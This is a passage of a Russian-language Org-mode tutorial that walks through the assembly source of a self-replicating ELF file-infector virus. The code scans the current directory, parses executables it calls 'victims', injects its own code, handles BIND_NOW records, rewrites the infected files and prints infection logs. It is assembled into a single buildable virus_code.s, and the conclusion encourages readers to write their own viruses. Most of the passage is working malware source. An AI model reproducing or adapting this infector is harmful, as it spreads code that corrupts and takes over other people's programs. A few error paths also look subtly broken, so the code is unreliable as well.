Проверяем, не больше ли виртуальный адрес текущей секции виртуального
адреса ~dynamic~ и если больше, то  увеличиваем его дополнительно на
значение в rbx

#+NAME: _shdr_addr_after_dynamic
#+BEGIN_SRC asm :noweb yes

        // секция расположенаа до dynamic?
        mov     dynamic_records_vaddr(%rip), %rax

        cmp      %rax, (%rdi)
        jle     _add_const_to_addr

        // да, скорректировать в соответствии
        // с возможным расширением dynamic
        add     %rbx,  SHDR_SH_ADDR(%rdi)

#+END_SRC

Аналогичным образом проверяем смещение секции.

#+NAME: _shdr_offset_after_dynamic
#+BEGIN_SRC asm :noweb yes

      // секция расположена до dynamic?
      mov     dynamic_records_offset(%rip), %rax
      cmp     %rax, SHDR_SH_OFFSET(%rdi)

      jle     _add_const_to_offset

      // нет, скорректировать в соответствии
      // с возможным расширением dynamic
      add     %rbx, SHDR_SH_OFFSET(%rdi)

#+END_SRC

А теперь вставляем этот функционал в ~_shdr_offset_and_addr_recount~.

#+NAME: _shdr_offset_and_addr_recount
#+BEGIN_SRC asm :noweb yes
  /// _SHDR_OFFSET_AND_ADDR_RECOUNT
  /// Пересчитывает адреса и смещения в заголовках, если они не 0
  /// Поскольку секция dynamic может расширяться (в заивимости от того,
  /// выставлен в ней флаг BIND_NOW компилером или нет),
  /// то код, который находится
  /// ниже секции dynamic должен сместиться, учитывая это расширение
      .globl  _shdr_offset_and_addr_recount
      .type	_shdr_offset_and_addr_recount, @function

  _shdr_offset_and_addr_recount:
      push  %rbx
      push  %rdx
      push  %rcx
      push  %r8
      push  %rdi
      push  %rsi

      // проверяем необходимые данные
      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je     _shdr_offset_and_addr_recount_fail

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je     _shdr_offset_and_addr_recount_fail

      <<_put_bind_now_flag_value1>>

      mov     $0x38, %rdx

  _shdr_offset_and_addr_recount_cycle:
      cmp     $0, SHDR_SH_ADDR(%rdi)      # sh_addr <= 0?
      jle     _recount_shdr_offset

      <<_shdr_addr_after_dynamic>>

  _add_const_to_addr:
      add     %rdx,  SHDR_SH_ADDR(%rdi)

  _recount_shdr_offset:
      cmp     $0, SHDR_SH_OFFSET(%rdi)
      jle     _next_iter_recount

      <<_shdr_offset_after_dynamic>>

  _add_const_to_offset:
      add     %rdx, SHDR_SH_OFFSET(%rdi)

  _next_iter_recount:
      add     $0x40, %rdi    # смещение до след. заголовка
      loop    _shdr_offset_and_addr_recount_cycle

  _shdr_offset_and_addr_recount_success:
      xor     %rax, %rax
      jmp     _shdr_offset_and_addr_recount_exit

  _shdr_offset_and_addr_recount_fail:
      mov      $-1, %rax

  _shdr_offset_and_addr_recount_exit:
      pop      %rsi
      pop      %rdi
      pop      %r8
      pop      %rcx
      pop      %rdx
      pop      %rbx
      ret

#+END_SRC

** Новое редактирование секции dynamic

Да, как не парадоксально, но записи в секции ~dynamic~ тоже нужно
редактировать с учетом того, что секция может расшириться: в теории
dynamic может описывать код, который расположен в файле или в памяти
после нее.

Сначала положим содержимое ~new_bind_now_flag_record_size~ в ~rbx~.

#+NAME: _add_bind_now_to_dynamic1
#+BEGIN_SRC asm :noweb yes
      mov     new_bind_now_flag_record_size(%rip), %rbx

#+END_SRC

И теперь добавим проверку для редактируемого адреса в записи:

#+NAME: _add_bind_now_to_dynamic2
#+BEGIN_SRC asm  :noweb yes

    // код лежит после секции dynamic?
    cmp     %r9,  (%rax)
    jle     _add_const

    add     %rbx, (%rax)

#+END_SRC
[[_recount_dynamic_section][_recount_dynamic_section]]
** Новое редактирование got

Редактирование записей в got нужно усовершенствовать по тому же принципу,
что и редактирование записей в ~dynamic~.

#+NAME: _add_bind_now_to_got_records1
#+BEGIN_SRC asm :noweb yes
        mov     new_bind_now_flag_record_size(%rip), %rdx

#+END_SRC

Если виртуальный адрес в записи ~got~ больше, чем виртуальный адрес
секции ~dynamic~, то прибавляем к редактируемому адресу значение
~new_bind_now_flag_record_size~, а только потом увеличиваем его на 56
байт.

#+NAME: _add_bind_now_to_got_records2
#+BEGIN_SRC asm :noweb yes
      cmp     %r8, (%rax)
      jle     _add_const_to_got_record

      add     %rdx, (%rax)

#+END_SRC
[[_recount_got_section][_recount_got_section]]

** Новое редактирование секций rela

Так же нужно отредактировать секции ~rela~

#+NAME: _add_bind_now_to_rela1
#+BEGIN_SRC asm :noweb yes

      mov     new_bind_now_flag_record_size(%rip), %rbx

#+END_SRC

Если редактируемый адрес больше виртуального адреса ~dynamic~, то сначала
прибавляем к нему значение ~new_bind_now_flag_record_size~.

#+NAME: _add_bind_now_to_rela2
#+BEGIN_SRC asm :noweb yes

      cmp     %r8, (%rax)
      jle     _add_const_to_rela

      // vaddr релокейта + размер новой записи
      // dynamic
      add     %rbx, (%rax)

#+END_SRC
[[_recount_rela_current_section][_recount_rela_current_section]]

** Новое редактирование symtab

По известной кальке дополняем редактирование ~symtab~

#+NAME: _add_bind_now_to_symtab1
#+BEGIN_SRC asm :noweb yes

mov     new_bind_now_flag_record_size(%rip), %rbx

#+END_SRC

#+NAME: _add_bind_now_to_symtab2
#+BEGIN_SRC asm :noweb yes

cmp     %r8, (%rdi)
jle     _add_const_symtab

add     %rbx, (%rdi)  # сместили на разм. +1 dyn. record

#+END_SRC

[[_recount_symbols_addrs][_recount_symbols_addrs]]

** Учесть BIND_NOW при редактировании поля e_shoff в заголовке ELF-a

При редактировании ~e_shoff~, который содержит смещение заголовков секций
в файле, нужно учесть, что секция ~.dynamic~ может расширяться на одну
запись.

Поэтому прибавим содержимое ~new_bind_now_flag_record_size~ к новому
смещению в ~e_shoff~

#+NAME: _add_bind_now_rec_to_e_shoff
#+BEGIN_SRC asm :noweb yes

   mov     new_bind_now_flag_record_size(%rip), %rdx
   add     %rdx, %rsi  # + размер вставляемой записи dynamic

#+END_SRC

[[_edit_elf_hdr][_edit_elf_hdr]]

** Создать запись BIND_NOW

Запись представляет собо 16 байт. Последние 8 байт заполнены нулями, в
первых 8 байтха лежит число ~0x18~.

#+NAME: _generate_bind_now_flag_record
#+BEGIN_SRC asm
  /// GENERATE_BIND_NOW_FLAG_RECORD
  /// Создает запись для флага BIND_NOW
  _generate_bind_now_flag_record:
      mov     new_bind_now_flag_record_size(%rip), %rax
      test    %rax, %rax
      je      _generate_bind_now_flag_record_fail

      leaq    bind_now_flag_record(%rip), %rax
      movb    $0x18, (%rax)

  _generate_bind_now_flag_record_success:
      xor     %rax, %rax
      jmp     _generate_bind_now_flag_record_exit

  _generate_bind_now_flag_record_fail:
      mov     $-1, %rax

  _generate_bind_now_flag_record_exit:
      ret

#+END_SRC

Поскольку генерация новых данных в общем можно отнести к редактированию
файла мишени, вызовем эту функцию из ~recount_victim~:

#+NAME: _call_generate_bind_now_flag_record
#+BEGIN_SRC asm :noweb yes
      call    _generate_bind_now_flag_record
#+END_SRC

[[_recount_victim][_recount_victim]]

** Вставка BIND_NOW

Единственный способ вставить запись BIND_NOW - это вписать код жертвы до
точки вставки, затем вписать запись, а затем вставить оставшийся код
жертвы.

Это требует отдельного функционала: во-первых, для записи в файл, а во
вторых, чтоб получить адреса и размеры двух частей кода мишени, потому
что без этого их невозможно вписать в файл, оместив между ними новую
запись.

Сначала "раскроим" код мишени на две условные части: от начала кода и до
вставки BIND_NOW и от вставки до заголовоков секций мишени.

Чтобы сделать это, нужно:
- посчитать смещение кода жертвы: размер таблицы заголвоков сегментов +
  размер заголвока ELF-a

  #+NAME: _get_victim_code_offset
  #+BEGIN_SRC asm :noweb yes
          mov     victim_phdr_table_size(%rip), %rcx
          leaq    victim_code_offset(%rip), %rdx
          mov     %rcx, (%rdx)
          add     $0x40, (%rdx)   # save victim begin code offset

  #+END_SRC

- высчитать адрес в памяти начала кода жертвы - адрес таблицы заголовков
  сегментов + размер этой таблицы

  #+NAME: _get_victim_code_addr1
  #+BEGIN_SRC asm :noweb yes
        mov     victim_phdr_table_addr(%rip), %rdx
        add     %rdx, %rcx

        // сохранили адрес начала кода
        mov     %rcx, victim_code_before_bind_now_addr(%rip)
  #+END_SRC

 - считаем адрес второй половины кода мишени: она начнется с записи NULL
   секции ~.dynamic~: смещение секции ~.dynamic~ от начала файла +
   смещение записи NULL от начала ~.dynamic~ + базовый адрес ELF-a

  #+NAME: _get_victim_code_addr2
  #+BEGIN_SRC asm :noweb yes
        mov     dynamic_records_offset(%rip), %rdi
        mov     new_bind_now_record_frm_dynamic_offset(%rip), %rsi
        add     %rdi, %rsi  # offsetnew bind_now record frm file begin

        mov     victim_elf_addr(%rip), %rdx
        add     %rsi, %rdx
        mov     %rdx,  victim_code_after_bind_now_addr(%rip)

  #+END_SRC

- считаем размер первой половины кода мишени: из адреса второй половины
  вычитается адрес первой

  #+NAME: _get_victim_code_addr_size1
  #+BEGIN_SRC asm :noweb yes
        sub     %rcx, %rdx
        mov     %rdx, victim_code_before_bind_now_size(%rip)

  #+END_SRC

- считаем размер второй половины кода мишени: из адреса таблицы
  заголовков секций вычитается адрес второй половины кода мишени

  #+NAME: _get_victim_code_addr_size2
  #+BEGIN_SRC asm :noweb yes
        mov     victim_code_after_bind_now_addr(%rip), %rsi
        mov     victim_shdr_table_addr(%rip), %rdx
        sub     %rsi, %rdx
        mov     %rdx, victim_code_after_bind_now_size(%rip)

  #+END_SRC

Теперь помещаем эти кусочки алгоритма в единую функцию
~_get_victim_code_addr_and_size_with_bind_now~.

#+NAME: _get_victim_code_addr_and_size_with_bind_now
#+BEGIN_SRC asm  :noweb yes
  /// _GET_VICTIM_CODE_ADDR_AND_SIZE_WITH_BIND_NOW
  /// Если мы вставляем запись BIND_NOW,
  /// то высчитываем:
  /// - адрес и размер кода жертвы от его начала до
  ///   места вставки BIND_NOW
  /// - адрес и размер кода жертвы от места вставки BIND_NOW
  ///   и до его конца
  _get_victim_code_addr_and_size_with_bind_now:
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      // вставляем BIND_NOW?
      mov     new_bind_now_flag_record_size(%rip), %rcx
      test    %rcx, %rcx
      je     _get_victim_code_addr_and_size_with_bind_now_fail

      // проверка необходимых данных для высчитывания
      mov     victim_phdr_table_size(%rip), %rcx
      test    %rcx, %rcx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     victim_phdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     victim_shdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     victim_shdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov      dynamic_records_offset(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     new_bind_now_record_frm_dynamic_offset(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      // если все данные на месте, начинаем считать
      <<_get_victim_code_offset>>

      <<_get_victim_code_addr1>>

      <<_get_victim_code_addr2>>

      // высчитали размер кода от начала до вставки

      <<_get_victim_code_addr_size1>>

      // высчитали размер кода от вставки до конца

      <<_get_victim_code_addr_size2>>

      xor     %rax, %rax
      jmp     _get_victim_code_addr_and_size_with_bind_now_exit

  _get_victim_code_addr_and_size_with_bind_now_fail:
      xor     $-1, %rax

  _get_victim_code_addr_and_size_with_bind_now_exit:
      pop     %rsi
      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

Поскольку действия, описанные выше, напрямую относятся к парсингу жертвы,
будем вызывать этот функционал из ~parse_victim~:

#+NAME: _call_get_victim_code_addr_and_size_with_bind_now
#+BEGIN_SRC asm :noweb yes
        call    _get_victim_code_addr_and_size_with_bind_now
        test    %rax, %rax
        jne     _parse_victim_fail
#+END_SRC

Теперь, когда необходимый код найден, оформим его запись

Сначала вписываем код конца таблицы сегментов до записи NULL в секции
~.dynamic~:

#+NAME: _write_victim_code1
#+BEGIN_SRC asm :noweb yes
        mov     file_offset(%rip), %rcx
        mov     %rcx, %r10
        mov     %rcx, %r8

        mov     victim_code_before_bind_now_addr(%rip), %rsi
        mov     victim_code_before_bind_now_size(%rip), %rdx

        add     %rdx, %r8
        mov     interm_fd_file(%rip), %rdi
        mov     $0x12, %rax
        syscall

        test   %rax, %rax
        je     _write_victim_code_with_bind_now_fail

#+END_SRC

Теперь вписываем запись BIND_NOW:

#+NAME: _write_bind_now
#+BEGIN_SRC asm :noweb yes
  // вписываем запись BIND_NOW
      mov     %r8, %rcx
      mov     %rcx, %r10

      leaq    bind_now_flag_record(%rip), %rsi
      mov     new_bind_now_flag_record_size(%rip), %rdx

      add     %rdx, %r8

      mov     interm_fd_file(%rip), %rdi
      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_victim_code_with_bind_now_fail

#+END_SRC

Вписываем оставший код мишени до таблицы заголовков секций:

#+NAME: _write_victim_code2
#+BEGIN_SRC asm :noweb yes
      mov     %r8, %rcx
      mov     %rcx, %r10

      mov     victim_code_after_bind_now_addr(%rip), %rsi
      mov     victim_code_after_bind_now_size(%rip), %rdx

      add     %rdx, %r8

      mov     interm_fd_file(%rip), %rdi
      mov     $0x12, %rax   # syscall pwrite
      syscall
#+END_SRC

Теперь соединяем фрагменты в единый алгоритм ~_write_victim_code_with_bind_now~:

#+NAME: _write_victim_code_with_bind_now
#+BEGIN_SRC asm :noweb yes
  /// _WRITE_VICTIM_CODE_WITH_BIMD_NOW
  /// Вписывает жертву с записью BIND_NOW
  _write_victim_code_with_bind_now:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     new_bind_now_flag_record_size(%rip), %rdi
      test    %rdi, %rdi
      je      _write_victim_code_with_bind_now_fail

      <<_write_victim_code1>>

      // вписываем запись BIND_NOW

      <<_write_bind_now>>

      // вписываем жертву от точки, куда вставили
      // запись BIND_NOW, до конца
      <<_write_victim_code2>>

      mov    %r8, file_offset(%rip) # 0x401918

      test   %rax, %rax
      je     _write_victim_code_with_bind_now_fail


  _write_victim_code_with_bind_now_success:
      xor    %rax, %rax
      jmp     _write_victim_code_with_bind_now_exit

  _write_victim_code_with_bind_now_fail:
      mov     $-1, %rax

  _write_victim_code_with_bind_now_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Вставим вызов этой функцию в ~recombine_elf~, который перезаписывает
ELF-файл:

#+NAME: _call_write_victim_code_with_bind_now
#+BEGIN_SRC asm :noweb yes
        call    _write_victim_code_with_bind_now
        test    %rax, %rax
        jne     _recombine_elf_fail

#+END_SRC

[[_recombine_elf][_recombine_elf]]

** Как сдвинуть код мишени, если в нем есть вставленная запись BIND_NOW

Выше мы договорились, что во время сдвига нужно сделать следующее:
- затереть заголовок вируса
- оставить секцию ~dynamic~ на месте
- затереть ее нижние 72 байта: код, следующий за ней, должен сместиться
  на размер вставленного заголовка вируса и размер записи BIND_NOW.

Для этого придется подкорректировать ~memcpy~, которая переписывает
сегменты. Теперь алгоритм ~memcpy~ изменится.

Добавим в алгоритм адрсе секции ~.dynamic~ в памяти:

#+NAME: _add_dynamic_to_memcpy
#+BEGIN_SRC asm :noweb yes
        mov     dynamic_records_addr(%rip), %rax
#+END_SRC


И создадим цикл, который на каждой итреации будет проверять, совпадает ли
адрес источника в rsi с адресом ~.dynamic~ в памяти:

[TODO:gmm] Я знаю, что это очень неоптимальный алгорим. Надо придумать
что-то поизящнее.

#+NAME: _cycle1
#+BEGIN_SRC asm :noweb yes
        // этот цикл работает, пока мы
        // перемещаем все до секции dynamic
        movb    (%rsi), %dl
        cmp     %rax, %rsi
        // как только мы на нее наткнулись
        // пропускаем ее
        je      _scip_dynamic
        movb    %dl, (%rdi)

        inc     %rsi
        inc     %rdi

        loop    _cycle_my_memcpy
        jmp     _my_memcpy_success

#+END_SRC

Если адрес-источник равен адресу секции ~.dynamic~, это означает, что мы
достигли этой секции. Теперь ее нужно пропустить. Для этого указатели
исчтоник и приемник увеличиваются на размер секции ~dynamic~. А поскольку
в ~.dynamic~ может быть запись BIND_NOW, которая должна быть затерта, то
указатль-приемник уменьшается на содержимое
~new_bind_now_flag_record_size~. Поскольку мы не перезаписываем кусок
кода, то количество итераций нужно сократить на размер секции ~.dynamic~:

#+NAME: _scip
#+BEGIN_SRC asm :noweb yes
      mov     dynamic_records_size(%rip), %rdx

      // сдвинуть указатели на конец
      // секции dynamic
      add     %rdx, %rdi
      add     %rdx, %rsi

      // уменьшить количество итераций
      sub     %rdx, %rcx

      // сдвинуть dest так, чтоб
      // запись BIND_NOW, если она есть
      // была затерта
      mov     new_bind_now_flag_record_size(%rip), %rdx
      sub     %rdx, %rdi

#+END_SRC

После пропуска ~.dynamic~ обратно возвращаемся в цикл и сдвигаем сегмент
дальше.

Вставим это в ~memcpy~:
#+NAME: _my_memcpy
#+BEGIN_SRC asm :noweb yes
  /// _MY_MEMCPY
  /// Переписывает код с одного адреса
  /// в другой
  _my_memcpy:
      pushq    %rcx
      pushq    %rdx
      pushq    %rdi
      pushq    %rsi

      mov     cur_seg_memsz(%rip), %rcx
      test    %rcx, %rcx
      je      _my_memcpy_fail

      mov     cur_seg_addr(%rip), %rsi
      test    %rsi, %rsi
      je      _my_memcpy_fail

      mov     %rsi, %rdi
      sub     $0x38, %rdi

      <<_add_dynamic_to_memcpy>>

  _cycle_my_memcpy:

      <<_cycle1>>

      // пропускаем секцию dynamic -
      // не редактируем ее
  _scip_dynamic:

      <<_scip>>

      jmp     _cycle_my_memcpy
  _my_memcpy_success:
      xor     %rax, %rax
      jmp     _my_memcpy_exit

  _my_memcpy_fail:
      mov     $-1, %rax

  _my_memcpy_exit:
      popq    %rsi
      popq    %rdi
      popq    %rdx
      popq    %rcx
      ret

#+END_SRC

Теперь сдвиг мишени будет работать без проблем и при наличии вставленной
BIND_NOW, и без нее.

* Сборка вируса

Наконец-то, можно собрать проект, объединив весь функционал между собой.

Начнем, конечно, с метки ~_start~. Ее единственная задача - это передать
управление ~_start_infector~. Дело в том,  что между ~start~ и
~_start_infector~ лежат переменные, макросы и константы. Нам нужно, чтоб
они вошли в секцию ~.text~, чтоб записать и их в инфицированный файл, но
совершенно не надо, чтоб на них перешло управление.

#+NAME: _start
#+BEGIN_SRC asm
      .text 0

      .global	_start
      .type	_start, @function

  _start:
      leaq    _start_infector(%rip), %rsi
      jmp     *%rsi

#+END_SRC

Хотелось бы, чтоб вирус мог выводить свой лог: что он попытался заразить
и что в итоге заразил. Напишем для этого две функции:
~_print_infection_log~ и ~_print_success_infection_msg~.

~_print_infection_log~ печатает имя файла и сообщение, что вирус
попытался его заразить:

#+NAME: _print_infection_log
#+BEGIN_SRC asm
  /// Печатает имя файла,
    /// который пытается заразить вирус в
    /// данный момент
    _print_infection_log:
        push     %rsi
        push     %rdi
        push     %rdx

        mov      file_name_ptr(%rip), %rsi
        test     %rsi, %rsi
        je       _print_infection_log_fail

        mov      file_name_ptr(%rip), %rdi
        call     _my_strlen

        mov      string_length(%rip), %rdx
        test     %rdx, %rdx
        je       _print_infection_log_fail

        call    _my_write

        lea     _msg_cur_infection(%rip), %rsi
        mov     $0x16, %rdx
        call    _my_write

        xor     %rax, %rax
        jmp     _print_infection_log_exit
    _print_infection_log_fail:
        mov     $-1, %rax

    _print_infection_log_exit:
        pop     %rdx
        pop     %rdi
        pop     %rsi
        ret
#+END_SRC

А ~_print_success_infection_msg~ печатает имя файла и сообщение, что
вирус его успешно заразил:

#+NAME: _print_success_infection_msg
#+BEGIN_SRC asm
  /// _PRINT_SUCCESS_INFECTION_MSG
  /// Печатает вывод об успешном инфицировании файла
  _print_success_infection_msg:
      push     %rsi
      push     %rdi
      push     %rdx

      mov      file_name_ptr(%rip), %rsi
      test     %rsi, %rsi
      je       _print_success_infection_msg_fail

      mov      file_name_ptr(%rip), %rdi
      call     _my_strlen

      mov      string_length(%rip), %rdx
      test     %rdx, %rdx
      je       _print_infection_log_fail

      call    _my_write

      lea     _msg_infection_success(%rip), %rsi
      mov     $0x1b, %rdx
      call    _my_write

      xor     %rax, %rax
      jmp     _print_success_infection_msg_exit

  _print_success_infection_msg_fail:
      mov     $-1, %rax

  _print_success_infection_msg_exit:
      pop     %rdx
      pop     %rdi
      pop     %rsi
      ret

#+END_SRC

Еще нам нужно позаботиться об аварийном выходе для вируса, когда он будет
исполняться из какого-то инфицированного файла, на случай, если что-то
пойдет совсем не так - код выхода по метке ~_global_exit~ затирается
переводом управления на мишень и прочим.

Так что создадим идентичную ~_global_exit~ функцию.

#+NAME: _exit_virus
#+BEGIN_SRC asm
  /// _EXIT_VIRUS
  /// Аварийный выход из вируса
  _exit_virus:
      mov $0x3c, %rax
      mov $0x0,  %rdi
      syscall

#+END_SRC

 Теперь соберем это все в ~start_infector~, который является по факту
~driver loop~ вируса.

Алгоритм предельно простой:
- разрешаем вирусу самомодификацию
- сохраняем регистры
- устанавливаем в перменные значения по умолчанию
- открываем текущий каталог и считываем из него все записи о файлах и
  каталогах
- пробуем получить имя файла. Если не удалось, то восстанавливаем
  регистры и
  выходим из вируса.
- иначе мапим и пробуем его распарсить. Если ~parse_victim~
  вернет ~fail~, то мы попробуем взять новое имя жертвы и распарсить
  ее. И так до тех пор, пока они не кончатся.
- если парсинг удался, вытаскиваем код вируса
- если с кодом вируса все прошло успешно, занимаемся пересчитываем жертвы
  и генерированием новых заголовков и прочего. Если этот этап сфейлился,
  то восстанавливаем регистры и выходим.
- если и с пересчетом все прошло хорошо, то перекомбинируем эльф
- если эльф удалось перекомпилировать, переписываем весь код из
  промежуточного файла в тот, что планировали заразить изначально
- печатаем сообщение об успешном заражении
- восстанавливаем значание регистров
- выход

#+NAME: _start_infector
#+BEGIN_SRC asm :noweb yes
  /// _START_INFECTOR
  /// старт инфектора
  _start_infector:
      call    _allow_write_into_code

      jmp     _save_registers

  _prepare_data:
      call    _clear_old_data

      call    _my_readdir

  _get_victim_name:
      call    _get_file_name
      test    %rax, %rax
      jne     _restore_registers_and_stack

      call    _print_infection_log

      call    _parse_victim
      test    %rax, %rax
      jnz     _get_victim_name

      call    _get_virus_code

      call    _recount_victim
      test    %rax, %rax
      jne     _restore_registers_and_stack

      call    _open_interm_file
      test    %rax, %rax
      jne     _restore_registers_and_stack

      call    _recombine_elf
      test    %rax, %rax
      jne     _restore_registers_and_stack

      call    _rewrite_to_victim_file
      test    %rax, %rax
      jne     _restore_registers_and_stack

      call    _print_success_infection_msg

  <<_restore_registers_and_stack>>
#+END_SRC

И обозначим конец кода вируса - нам нужна эта метка, чтоб определить размер
кода вируса при вызове ~mprotect~.

#+NAME: _fin_infector
#+BEGIN_SRC asm
  _fin_infector:
      nop

#+END_SRC

* Сборка проекта

#+NAME: tangle
#+BEGIN_SRC asm :tangle virus_code.s :noweb tangle :exports code :padline no :comments none
  <<_start>>
  <<_debug_msg>>
  <<_check_canary>>
  <<_openfile_consts>>
  <<vars>>
  <<_print_infection_log>>
  <<_print_success_infection_msg>>
  <<_allow_write_into_code>>
  <<_clear_old_data>>
  <<_clear_array>>
  <<_my_readdir>>
  <<_get_file_name>>
  <<_my_strlen>>
  <<_my_write>>
  <<_my_memcpy>>
  <<_openfile>>
  <<_my_mmap>>
  <<_my_stat>>
  <<_get_victim_addr>>
  <<_is_it_elf>>
  <<_get_phdrs_info>>
  <<_get_shdrs_info>>
  <<_check_file_infection>>
  <<_find_first_seg_vaddr>>
  <<_find_last_seg_vaddr>>
  <<_find_dynamic>>
  <<_find_bind_now_record>>
  <<_find_got_section_vaddr>>
  <<_find_got_section_im_memory>>
  <<_get_victim_whole_code_addr_and_size>>
  <<_get_victim_code_addr_and_size_with_bind_now>>
  <<_find_victim_text_section>>
  <<_find_symtab>>
  <<_count_victim_code_begin_vaddr>>
  <<_parse_victim>>
  <<_recount_symbols_addrs>>
  <<_recount_rela_sections>>
  <<_recount_rela_current_section>>
  <<_shdr_offset_and_addr_recount>>
  <<_phdr_offset_and_addr_recount>>
  <<_recount_dynamic_section>>
  <<_recount_got_section>>
  <<_count_virus_new_vaddr>>
  <<_generate_virus_phdr>>
  <<_generate_virus_shdr>>
  <<_generate_bind_now_flag_record>>
  <<_edit_elf_hdr>>
  <<_count_offset_to_orig_e_entry>>
  <<_count_offset_to_move_victim>>
  <<_count_offset_to_e_entry_frm_file_begin>>
  <<_count_frm_orig_e_entry_to_virus_e_entry_offset>>
  <<_transfer_control_to_victim>>
  <<_make_victim_data_block_with_dynamic_data>>
  <<_make_victim_data_block_without_dynamic_data>>
  <<_recount_victim>>
  <<_get_virus_code>>
  <<_open_interm_file>>
  <<_rewrite_to_victim_file>>
  <<_write_till_phdr_table_end>>
  <<_write_new_phdr_virus>>
  <<_write_whole_victim>>
  <<_write_victim_code_with_bind_now>>
  <<_write_virus_code>>
  <<_write_transfer_control_code_block>>
  <<_write_data_block>>
  <<_write_victim_shdrs>>
  <<_write_virus_new_shdr>>
  <<_recombine_elf>>
  <<_get_segm_addr_and_sz>>
  <<_count_begin_elf_addr_in_memory>>
  <<_count_dynamic_addr>>
  <<_move_victim>>
  <<_mprotect_in_loop>>
  <<_move_segments>>
  <<_get_move_victim_data>>
  <<_exit_virus>>
  <<_save_registers>>
  <<_start_infector>>
  <<_fin_infector>>
#+END_SRC

* Заключение

Я надеюсь, что мой опыт был кому-то полезен и теперь вы сможете не просто
реализовать такой же вирус как у меня, но и создать свой собственный,
поскольку ELF-файлы, загрузка программ и линковка перестали быть для вас
каким-то колдунством. К тому же, эти знания достатоно универсальны, чтоб
вы могли использовать их в других своих проектах, не относящихся к
вирусописанию.
